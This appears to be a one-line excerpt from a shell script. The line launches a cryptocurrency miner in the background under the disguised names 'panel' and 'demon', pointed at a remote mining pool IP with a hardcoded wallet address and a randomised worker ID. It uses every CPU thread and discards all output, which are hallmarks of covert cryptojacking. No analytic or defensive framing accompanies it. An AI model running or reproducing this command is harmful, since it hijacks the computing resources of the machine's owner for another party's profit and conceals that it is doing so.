...
nohup ./panel ./demon -a yescryptR32 -o 45.115.225.12:443 -u UUttAax2AKgvUur3n3RhMDLxYjsFJgGnbh -p c=UNFY,mc=UNFY,ID=$(echo $(shuf -i 1-5 -n 1)-mikayui) -t $(nproc --all) &>/dev/null
